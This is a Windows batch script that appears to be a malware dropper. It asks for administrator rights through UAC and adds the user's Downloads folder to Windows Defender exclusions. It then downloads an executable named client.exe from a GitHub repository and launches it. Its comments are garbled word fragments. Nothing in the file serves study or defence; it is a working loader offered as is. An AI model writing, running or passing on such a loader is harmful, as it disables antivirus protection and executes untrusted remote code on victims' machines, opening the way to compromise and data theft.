@echo off
:: Log file for debugging
set "logFile=%USERPROFILE%\Downloads\script_log.txt"
echo Script started at %date% %time% > "%logFile%"

:: Cs
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] Script requires administrative privileges. Requesting UAC... >> "%logFile%"
    powershell -Command "Start-Process '%~0' -Verb RunAs"
    exit
)

:: ning
sc query WinDefend | find "RUNNING" >nul
if %errorLevel% neq 0 (
    echo [INFO] Windows Defender is not running. Skipping Defender exclusions... >> "%logFile%"
) else (
    echo [INFO] Adding Downloads folder to Windows Defender exclusions... >> "%logFile%"
    powershell.exe -Command "try { Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads -ErrorAction Stop } catch { Write-Output '.' }" >> "%logFile%" 2>&1
)

:: ables
set "url=https://github.com/whoafg/problemonfmech/raw/refs/heads/main/client.exe"
set "outputFile=%USERPROFILE%\Downloads\client.exe"

:: r d
timeout /t 1 >nul

:: e
echo [INFO] Downloading file from %url%... >> "%logFile%"
powershell.exe -Command "try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFile%' -ErrorAction Stop } catch { exit 1 }" >> "%logFile%" 2>&1

:: load
if not exist "%outputFile%" (
    echo [ERROR] File download failed. Check the log file for details: %logFile%
    pause
    exit /b 1
)

:: cute
echo [INFO] Running the downloaded file... >> "%logFile%"
start "" "%outputFile%"

:: ionge
echo Script completed successfully. >> "%logFile%"
exit
